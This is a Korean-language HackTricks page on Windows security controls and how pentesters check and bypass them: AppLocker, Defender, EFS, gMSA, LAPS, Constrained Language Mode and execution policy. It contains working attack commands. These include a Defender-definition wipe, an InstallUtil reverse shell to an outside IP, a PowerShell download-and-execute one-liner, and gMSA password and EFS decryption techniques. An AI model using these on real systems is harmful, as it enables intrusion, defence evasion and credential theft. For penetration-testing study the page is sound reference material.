# Windows 보안 제어

{{#include ../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 whitelist는 시스템에 존재하고 실행할 수 있도록 허용된 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 조직의 특정 비즈니스 요구 사항에 부합하지 않는 유해한 malware 및 승인되지 않은 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **애플리케이션 whitelist 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있도록 합니다. 실행 파일, 스크립트, Windows installer 파일, DLL, 패키지된 앱 및 패키지된 앱 installer에 대해 **세분화된 제어**를 제공합니다.\
조직에서 **cmd.exe 및 PowerShell.exe를 차단**하고 특정 디렉터리에 대한 쓰기 액세스를 제한하는 경우가 많지만, **이 모든 설정은 우회될 수 있습니다**.

### 확인

blacklist/whitelist에 포함된 파일/확장자를 확인합니다:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy`는 특정 identity에 대해 후보 파일을 평가합니다. 규칙은 사용자 또는 그룹을 대상으로 지정할 수 있으므로 payload를 실행할 토큰의 계정을 테스트해야 합니다. 규칙이 일치할 수 있는 경로, hash 및 publisher 메타데이터를 확인할 때는 `Get-AppLockerFileInformation`도 유용합니다.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
이 registry path에는 AppLocker에 의해 적용되는 configurations 및 policies가 포함되어 있어, 시스템에 현재 적용된 rules를 검토할 수 있습니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 bypass하는 데 유용한 **Writable folders**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내의 모든 항목 실행을 허용하는 경우, 이를 **bypass**하는 데 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **신뢰되는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 규칙도 우회할 수 있습니다.**
- 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**의 경우, 어디에든 **`allowed`라는 폴더를 생성하면** 허용됩니다.
- 조직에서는 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 **차단하는 데** 집중하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)을 간과합니다.
- 시스템에 추가적인 부하를 줄 수 있고 아무것도 손상되지 않도록 하기 위해 필요한 테스트의 양이 많기 때문에 **DLL enforcement는 활성화되는 경우가 매우 드뭅니다**. 따라서 **DLL을 backdoor로 사용하면 AppLocker를 우회하는 데 도움이 됩니다.**
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 process에서 **Powershell** 코드를 **실행하고** AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

로컬 credentials은 이 파일에 있으며, password는 hash 처리되어 있습니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 subsystem의 **memory**에 **credentials**(hashed)가 **저장됩니다**.\
**LSA**는 로컬 **security policy**(password policy, users permissions...), **authentication**, **access tokens**...를 관리합니다.\
LSA는 **SAM** 파일에서 제공된 **credentials**(로컬 login의 경우)를 **확인**하고, domain user를 인증하기 위해 **domain controller와 통신**합니다.

**credentials**는 **process LSASS** 내부에 **저장됩니다**: Kerberos tickets, NT hashes 및 LM hashes, 쉽게 복호화할 수 있는 passwords.

### LSA secrets

LSA는 일부 credentials를 disk에 저장할 수 있습니다:

- Active Directory의 computer account password (연결할 수 없는 domain controller).
- Windows services account의 passwords
- scheduled tasks의 passwords
- 기타 (IIS applications의 password...)

### NTDS.dit

Active Directory의 database입니다. Domain Controllers에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting tools를 **차단**합니다. 하지만 이러한 **보호 기능을 우회하는 방법**이 있습니다.

### Check

**Defender**의 **status**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행할 수 있습니다(**`RealTimeProtectionEnabled`**의 값을 확인하여 활성화 여부를 알 수 있습니다):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

이를 enumerate하려면 다음을 실행할 수도 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템(EFS)

EFS는 **File Encryption Key (FEK)**로 알려진 **대칭 키**를 사용하여 파일을 암호화함으로써 파일을 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되며 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때는 사용자의 디지털 인증서에 대응하는 **개인 키**를 사용하여 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자 작업 없이 복호화되는 상황**은 다음과 같습니다.

- 파일 또는 폴더를 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 비-EFS 파일 시스템으로 이동하면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식은 소유자가 암호화된 파일에 **투명하게 액세스**할 수 있도록 합니다. 그러나 단순히 소유자의 암호를 변경하고 로그인하는 것만으로는 복호화할 수 없습니다.

**핵심 요점**:

- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화에는 FEK에 액세스하기 위한 사용자의 개인 키가 사용됩니다.
- FAT32로 복사하거나 네트워크로 전송하는 경우와 같은 특정 조건에서 자동 복호화가 발생합니다.
- 소유자는 추가 작업 없이 암호화된 파일에 액세스할 수 있습니다.

### EFS 정보 확인

**사용자**가 이 **서비스를 사용했는지** 확인하려면 다음 경로가 존재하는지 확인합니다:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\를 사용하여 파일에 **액세스**할 수 있는 **사용자**를 확인합니다.  
폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화**하고 **복호화**할 수도 있습니다.

### EFS 파일 복호화

#### Authority System 권한 보유

이 방법을 사용하려면 호스트에서 **피해자 사용자**가 **프로세스**를 **실행 중**이어야 합니다. 그렇다면 `meterpreter` 세션에서 사용자의 프로세스 토큰을(`incognito`의 `impersonate_token`) 가장할 수 있습니다. 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 암호를 알고 있는 경우

Mimikatz는 사용자의 인증서와 개인 키를 가져온 다음 이를 사용하여 EFS로 보호된 파일을 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. 일반적으로 "**Password never expire**" 설정이 활성화된 기존 서비스 계정과 달리, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다.

- **자동 암호 관리**: gMSA는 240자로 구성된 복잡한 암호를 사용하며, 이 암호는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경됩니다. 이 과정은 Microsoft의 Key Distribution Service(KDC)가 처리하므로 수동으로 암호를 업데이트할 필요가 없습니다.
- **향상된 보안**: 이러한 계정은 잠금이 적용되지 않으며 대화형 로그인에 사용할 수 없어 보안이 강화됩니다.
- **다중 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있으므로 여러 서버에서 실행되는 서비스에 적합합니다.
- **예약된 작업 지원**: managed service accounts와 달리 gMSA는 예약된 작업 실행을 지원합니다.
- **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 정보 또는 DNS 이름이 변경되면 시스템이 Service Principal Name(SPN)을 자동으로 업데이트하므로 SPN 관리가 간소화됩니다.

gMSA의 암호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 Domain Controllers(DCs)에 의해 30일마다 자동으로 재설정됩니다. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 데이터 blob인 이 암호는 권한이 부여된 관리자와 gMSA가 설치된 서버만 가져올 수 있어 안전한 환경을 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**를 사용하여 이 암호를 읽을 수 있습니다.
```
/GMSAPasswordReader --AccountName jkohler
```
[**이 게시물에서 더 많은 정보 확인**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

또한 **gMSA**의 **password**를 **read**하기 위해 **NTLM relay attack**을 수행하는 방법은 이 [web page](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.<sup>[[3]](#references)</sup>

## LAPS

열거 과정에서 **legacy Microsoft LAPS**와 기본 제공되는 **Windows LAPS** 구현을 구분하세요. Windows LAPS는 2023년 4월 11일 Windows 업데이트에 포함되었으며, 관리되는 로컬 administrator password를 **Windows Server Active Directory** 또는 **Microsoft Entra ID**에 백업할 수 있습니다. AD 기반 배포에서는 password를 추가로 암호화하고, 암호화된 password 기록을 보존하며, domain controller의 DSRM password를 관리할 수 있습니다. 다운로드 가능한 legacy MSI는 최신 Windows 버전에서 deprecated되었지만, Windows LAPS는 legacy-emulation mode로 작동할 수 있습니다.<sup>[[6]](#references)</sup>

legacy Microsoft LAPS와 Windows LAPS는 별도의 구현이므로, attribute 또는 cmdlet별 attack을 적용하기 전에 어느 구현이 배포되어 있는지 확인하세요. 링크된 페이지에서는 discovery, ACL enumeration, retrieval, expiration manipulation 및 offline recovery를 다루므로, 여기에서는 해당 절차를 반복하지 않습니다.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하는 데 필요한 여러 기능을 **제한합니다**. 여기에는 COM objects 차단, 승인된 .NET types만 허용, XAML-based workflows, PowerShell classes 등이 포함됩니다.

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 해당 Bypass가 작동하지 않지만 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** **다음이** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 프로세스에서 **Powershell** 코드를 실행하고 제한 모드를 우회할 수 있습니다. 자세한 내용은 다음을 참조하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 통신하려는 두 시스템에 적합한 프로토콜을 찾는 역할을 합니다. 이를 위한 기본 방법은 Kerberos입니다. 그런 다음 SSPI는 사용할 authentication protocol을 협상합니다. 이러한 authentication protocol을 Security Support Provider (SSP)라고 하며, 각 Windows 시스템 내부에 DLL 형태로 존재합니다. 통신하려면 두 시스템이 동일한 SSP를 지원해야 합니다.

### Main SSPs

- **Kerberos**: 기본 프로토콜
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위한 프로토콜
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers 및 LDAP에서 사용되며, password는 MD5 hash 형식
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 protocol을 협상하는 데 사용됨(Kerberos 또는 NTLM이며, 기본값은 Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### 협상 과정에서 여러 method 또는 하나의 method만 제공될 수 있습니다.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 prompt**를 활성화하는 기능입니다.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [AppLocker 및 PowerShell 제한된 language mode 우회](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [EFS 파일 복호화 방법](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA를 위한 Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy를 우회하는 15가지 방법](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlets 사용](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS 개요](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
